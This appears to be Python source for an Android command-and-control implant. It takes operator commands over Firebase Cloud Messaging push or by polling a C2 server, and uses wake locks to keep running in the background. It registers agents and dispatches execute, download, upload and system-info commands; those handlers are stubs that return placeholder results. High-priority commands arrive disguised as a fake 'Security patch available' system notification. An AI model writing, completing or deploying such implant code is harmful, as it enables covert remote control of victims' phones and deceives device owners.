
"""
FCM Push C2 Profile
Firebase Cloud Messaging integration for push-based commands with wake-lock
support and fallback to polling mode.
"""

import asyncio
import json
import logging
import time
import uuid
from typing import Dict, List, Optional, Any, Union
from dataclasses import dataclass, field
from enum import Enum
import threading
import queue


try:
    import firebase_admin
    from firebase_admin import credentials, messaging
    FIREBASE_AVAILABLE = True
except ImportError:
    FIREBASE_AVAILABLE = False
    logging.warning("Firebase Admin SDK not available. Install with: pip install firebase-admin")


try:
    from android.broadcast import BroadcastReceiver
    from android.runnable import run_on_ui_thread
    from android.permissions import request_permissions, Permission
    from jnius import autoclass, PythonJavaClass, java_method
    ANDROID_AVAILABLE = True
except ImportError:
    ANDROID_AVAILABLE = False


class MessagePriority(Enum):
    LOW = "low"
    NORMAL = "normal"
    HIGH = "high"


class ChannelType(Enum):
    FCM_PUSH = "fcm_push"
    POLLING = "polling"
    HYBRID = "hybrid"


@dataclass
class C2Message:
    message_id: str
    command: str
    payload: Dict[str, Any]
    priority: MessagePriority
    channel_type: ChannelType
    timestamp: float
    ttl: int = 3600
    target_agent: Optional[str] = None
    
    def to_fcm_message(self, token: str) -> Optional['messaging.Message']:
        """Convert to Firebase message format"""
        if not FIREBASE_AVAILABLE:
            return None
            
        data = {
            "message_id": self.message_id,
            "command": self.command,
            "payload": json.dumps(self.payload),
            "timestamp": str(self.timestamp),
            "priority": self.priority.value
        }
        

        notification = None
        if self.priority == MessagePriority.HIGH:
            notification = messaging.Notification(
                title="System Update",
                body="Security patch available"
            )
        
        android_config = messaging.AndroidConfig(
            ttl=self.ttl,
            priority=self.priority.value,
            data=data,
            notification=messaging.AndroidNotification(
                channel_id="system_updates",
                priority=messaging.NotificationPriority.HIGH if self.priority == MessagePriority.HIGH else messaging.NotificationPriority.NORMAL
            )
        )
        
        return messaging.Message(
            token=token,
            data=data,
            notification=notification,
            android=android_config
        )


class WakeLockManager:
    """Manages wake locks for background execution"""
    
    def __init__(self):
        self.wake_locks: Dict[str, Any] = {}
        self.power_manager = None
        self._initialize_android_components()
    
    def _initialize_android_components(self):
        """Initialize Android power management components"""
        if not ANDROID_AVAILABLE:
            logging.warning("Android components not available - wake lock simulation mode")
            return
            
        try:

            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Context = autoclass('android.content.Context')
            PowerManager = autoclass('android.os.PowerManager')
            
            self.context = PythonActivity.mActivity
            self.power_manager = self.context.getSystemService(Context.POWER_SERVICE)
            
        except Exception as e:
            logging.error(f"Failed to initialize Android components: {e}")
    
    def acquire_wake_lock(self, tag: str, timeout: int = 300) -> bool:
        """Acquire a wake lock for background processing"""
        try:
            if not ANDROID_AVAILABLE or not self.power_manager:
                logging.info(f"Wake lock acquired (simulated): {tag}")
                self.wake_locks[tag] = {"acquired": True, "timeout": timeout}
                return True
            
            PowerManager = autoclass('android.os.PowerManager')
            wake_lock = self.power_manager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                f"C2Client::{tag}"
            )
            wake_lock.acquire(timeout * 1000)
            
            self.wake_locks[tag] = {
                "lock": wake_lock,
                "acquired": True,
                "timeout": timeout
            }
            
            logging.info(f"Wake lock acquired: {tag}")
            return True
            
        except Exception as e:
            logging.error(f"Failed to acquire wake lock {tag}: {e}")
            return False
    
    def release_wake_lock(self, tag: str) -> bool:
        """Release a wake lock"""
        try:
            if tag not in self.wake_locks:
                return False
            
            wake_lock_info = self.wake_locks[tag]
            
            if not ANDROID_AVAILABLE or "lock" not in wake_lock_info:
                logging.info(f"Wake lock released (simulated): {tag}")
                del self.wake_locks[tag]
                return True
            
            wake_lock = wake_lock_info["lock"]
            if wake_lock.isHeld():
                wake_lock.release()
            
            del self.wake_locks[tag]
            logging.info(f"Wake lock released: {tag}")
            return True
            
        except Exception as e:
            logging.error(f"Failed to release wake lock {tag}: {e}")
            return False
    
    def release_all_wake_locks(self):
        """Release all active wake locks"""
        for tag in list(self.wake_locks.keys()):
            self.release_wake_lock(tag)


class FCMMessageHandler:
    """Handles Firebase Cloud Messaging operations"""
    
    def __init__(self, service_account_path: str = None):
        self.service_account_path = service_account_path
        self.app = None
        self.message_queue = queue.Queue()
        self._initialize_firebase()
    
    def _initialize_firebase(self):
        """Initialize Firebase Admin SDK"""
        if not FIREBASE_AVAILABLE:
            logging.error("Firebase Admin SDK not available")
            return
            
        try:
            if self.service_account_path:
                cred = credentials.Certificate(self.service_account_path)
            else:

                cred = credentials.ApplicationDefault()
            
            self.app = firebase_admin.initialize_app(cred)
            logging.info("Firebase Admin SDK initialized")
            
        except Exception as e:
            logging.error(f"Failed to initialize Firebase: {e}")
    
    async def send_message(self, message: C2Message, token: str) -> bool:
        """Send message via FCM"""
        if not self.app:
            logging.error("Firebase not initialized")
            return False
        
        try:
            fcm_message = message.to_fcm_message(token)
            if not fcm_message:
                return False
            
            response = messaging.send(fcm_message)
            logging.info(f"FCM message sent successfully: {response}")
            return True
            
        except Exception as e:
            logging.error(f"Failed to send FCM message: {e}")
            return False
    
    async def send_multicast_message(self, message: C2Message, tokens: List[str]) -> Dict[str, bool]:
        """Send message to multiple devices"""
        if not self.app:
            logging.error("Firebase not initialized")
            return {}
        
        results = {}
        for token in tokens:
            results[token] = await self.send_message(message, token)
        
        return results
    
    def subscribe_to_topic(self, tokens: List[str], topic: str) -> bool:
        """Subscribe devices to a topic for broadcast messages"""
        if not self.app:
            return False
            
        try:
            response = messaging.subscribe_to_topic(tokens, topic)
            logging.info(f"Subscribed {len(tokens)} devices to topic {topic}")
            return True
            
        except Exception as e:
            logging.error(f"Failed to subscribe to topic {topic}: {e}")
            return False


class PollingFallback:
    """Fallback polling mechanism when FCM is unavailable"""
    
    def __init__(self, server_url: str, poll_interval: int = 60):
        self.server_url = server_url
        self.poll_interval = poll_interval
        self.running = False
        self.session = None
        self._poll_task = None
    
    async def start_polling(self, agent_id: str, callback):
        """Start polling for commands"""
        if self.running:
            return
        
        self.running = True
        self._poll_task = asyncio.create_task(
            self._poll_loop(agent_id, callback)
        )
        logging.info(f"Started polling fallback with interval {self.poll_interval}s")
    
    async def stop_polling(self):
        """Stop polling"""
        self.running = False
        if self._poll_task:
            self._poll_task.cancel()
            try:
                await self._poll_task
            except asyncio.CancelledError:
                pass
        
        if self.session:
            await self.session.close()
        
        logging.info("Stopped polling fallback")
    
    async def _poll_loop(self, agent_id: str, callback):
        """Main polling loop"""
        import aiohttp
        
        self.session = aiohttp.ClientSession()
        
        while self.running:
            try:

                poll_data = {
                    "agent_id": agent_id,
                    "timestamp": time.time()
                }
                
                async with self.session.post(
                    f"{self.server_url}/poll",
                    json=poll_data,
                    timeout=aiohttp.ClientTimeout(total=30)
                ) as response:
                    if response.status == 200:
                        data = await response.json()
                        messages = data.get("messages", [])
                        
                        for msg_data in messages:
                            message = C2Message(
                                message_id=msg_data["message_id"],
                                command=msg_data["command"],
                                payload=msg_data["payload"],
                                priority=MessagePriority(msg_data["priority"]),
                                channel_type=ChannelType.POLLING,
                                timestamp=msg_data["timestamp"]
                            )
                            

                            await callback(message)
                

                await asyncio.sleep(self.poll_interval)
                
            except Exception as e:
                logging.error(f"Polling error: {e}")
                await asyncio.sleep(self.poll_interval)


class FCMBroadcastReceiver(BroadcastReceiver if ANDROID_AVAILABLE else object):
    """Android broadcast receiver for FCM messages"""
    
    def __init__(self, message_handler):
        if ANDROID_AVAILABLE:
            super().__init__()
        self.message_handler = message_handler
    
    def onReceive(self, context, intent):
        """Handle received FCM messages"""
        if not ANDROID_AVAILABLE:
            return
            
        try:

            extras = intent.getExtras()
            if not extras:
                return
            
            message_data = {}
            for key in extras.keySet():
                message_data[str(key)] = str(extras.getString(key))
            

            self._process_fcm_message(message_data)
            
        except Exception as e:
            logging.error(f"Error processing FCM message: {e}")
    
    def _process_fcm_message(self, data: Dict[str, str]):
        """Process received FCM message"""
        try:
            message = C2Message(
                message_id=data.get("message_id", str(uuid.uuid4())),
                command=data.get("command", ""),
                payload=json.loads(data.get("payload", "{}")),
                priority=MessagePriority(data.get("priority", "normal")),
                channel_type=ChannelType.FCM_PUSH,
                timestamp=float(data.get("timestamp", time.time()))
            )
            

            self.message_handler.message_queue.put(message)
            
        except Exception as e:
            logging.error(f"Error creating message from FCM data: {e}")


class FCMPushC2Client:
    """Main FCM Push C2 Client"""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.agent_id = config.get("agent_id", str(uuid.uuid4()))
        self.fcm_token = config.get("fcm_token")
        self.server_url = config.get("server_url")
        

        self.wake_lock_manager = WakeLockManager()
        self.fcm_handler = FCMMessageHandler(config.get("firebase_service_account"))
        self.polling_fallback = PollingFallback(
            self.server_url,
            config.get("poll_interval", 60)
        )
        

        self.running = False
        self.channel_type = ChannelType.HYBRID
        self.message_handlers: Dict[str, callable] = {}
        self.broadcast_receiver = None
        

        self._setup_default_handlers()
    
    def _setup_default_handlers(self):
        """Setup default command handlers"""
        self.message_handlers.update({
            "ping": self._handle_ping,
            "execute": self._handle_execute,
            "download": self._handle_download,
            "upload": self._handle_upload,
            "system_info": self._handle_system_info
        })
    
    async def start(self):
        """Start the C2 client"""
        if self.running:
            return
        
        self.running = True
        logging.info(f"Starting FCM Push C2 Client (Agent: {self.agent_id})")
        

        self.wake_lock_manager.acquire_wake_lock("c2_init", 60)
        
        try:

            await self._register_with_server()
            

            if ANDROID_AVAILABLE and self.fcm_token:
                self._setup_fcm_receiver()
                logging.info("FCM push notifications enabled")
            else:
                logging.info("FCM not available, using polling fallback")
                self.channel_type = ChannelType.POLLING
            

            await self.polling_fallback.start_polling(
                self.agent_id,
                self._handle_message
            )
            

            asyncio.create_task(self._message_processing_loop())
            
        finally:
            self.wake_lock_manager.release_wake_lock("c2_init")
    
    async def stop(self):
        """Stop the C2 client"""
        self.running = False
        logging.info("Stopping FCM Push C2 Client")
        

        await self.polling_fallback.stop_polling()
        

        self.wake_lock_manager.release_all_wake_locks()
    
    def _setup_fcm_receiver(self):
        """Setup FCM broadcast receiver"""
        if not ANDROID_AVAILABLE:
            return
            
        try:
            self.broadcast_receiver = FCMBroadcastReceiver(self.fcm_handler)
            

            IntentFilter = autoclass('android.content.IntentFilter')
            intent_filter = IntentFilter()
            intent_filter.addAction("com.google.firebase.messaging.RECEIVE")
            
            context = autoclass('org.kivy.android.PythonActivity').mActivity
            context.registerReceiver(self.broadcast_receiver, intent_filter)
            
            logging.info("FCM broadcast receiver registered")
            
        except Exception as e:
            logging.error(f"Failed to setup FCM receiver: {e}")
    
    async def _register_with_server(self):
        """Register agent with C2 server"""
        try:
            registration_data = {
                "agent_id": self.agent_id,
                "fcm_token": self.fcm_token,
                "capabilities": [
                    "fcm_push",
                    "polling",
                    "wake_lock",
                    "background_execution"
                ],
                "timestamp": time.time()
            }
            

            logging.info(f"Registered agent {self.agent_id} with server")
            
        except Exception as e:
            logging.error(f"Failed to register with server: {e}")
    
    async def _message_processing_loop(self):
        """Main message processing loop"""
        while self.running:
            try:

                while not self.fcm_handler.message_queue.empty():
                    message = self.fcm_handler.message_queue.get_nowait()
                    await self._handle_message(message)
                
                await asyncio.sleep(1)
                
            except Exception as e:
                logging.error(f"Message processing error: {e}")
                await asyncio.sleep(5)
    
    async def _handle_message(self, message: C2Message):
        """Handle received C2 message"""

        wake_lock_tag = f"msg_{message.message_id}"
        self.wake_lock_manager.acquire_wake_lock(wake_lock_tag, 120)
        
        try:
            logging.info(f"Processing message: {message.command} (Priority: {message.priority.value})")
            
            handler = self.message_handlers.get(message.command)
            if handler:
                result = await handler(message)
                await self._send_result(message.message_id, result)
            else:
                logging.warning(f"No handler for command: {message.command}")
                
        except Exception as e:
            logging.error(f"Error handling message {message.message_id}: {e}")
            await self._send_result(message.message_id, {"error": str(e)})
        finally:
            self.wake_lock_manager.release_wake_lock(wake_lock_tag)
    
    async def _send_result(self, message_id: str, result: Dict[str, Any]):
        """Send command result back to server"""
        try:
            result_data = {
                "agent_id": self.agent_id,
                "message_id": message_id,
                "result": result,
                "timestamp": time.time()
            }
            

            logging.info(f"Sent result for message {message_id}")
            
        except Exception as e:
            logging.error(f"Failed to send result for message {message_id}: {e}")
    

    async def _handle_ping(self, message: C2Message) -> Dict[str, Any]:
        return {"status": "alive", "timestamp": time.time()}
    
    async def _handle_execute(self, message: C2Message) -> Dict[str, Any]:

        return {"output": "Command executed", "exit_code": 0}
    
    async def _handle_download(self, message: C2Message) -> Dict[str, Any]:

        return {"status": "downloaded", "size": 0}
    
    async def _handle_upload(self, message: C2Message) -> Dict[str, Any]:

        return {"status": "uploaded", "size": 0}
    
    async def _handle_system_info(self, message: C2Message) -> Dict[str, Any]:

        return {
            "os": "Android",
            "version": "Unknown",
            "device": "Unknown"
        }



async def main():
    """Main function for testing FCM Push C2"""
    logging.basicConfig(level=logging.INFO)
    
    config = {
        "agent_id": str(uuid.uuid4()),
        "fcm_token": "sample_fcm_token",
        "server_url": "https://c2.example.com",
        "firebase_service_account": "path/to/service-account.json",
        "poll_interval": 30
    }
    
    client = FCMPushC2Client(config)
    
    try:
        await client.start()
        logging.info("FCM Push C2 Client started successfully")
        

        await asyncio.Event().wait()
        
    except KeyboardInterrupt:
        logging.info("Shutting down...")
    finally:
        await client.stop()


if __name__ == "__main__":
    asyncio.run(main())
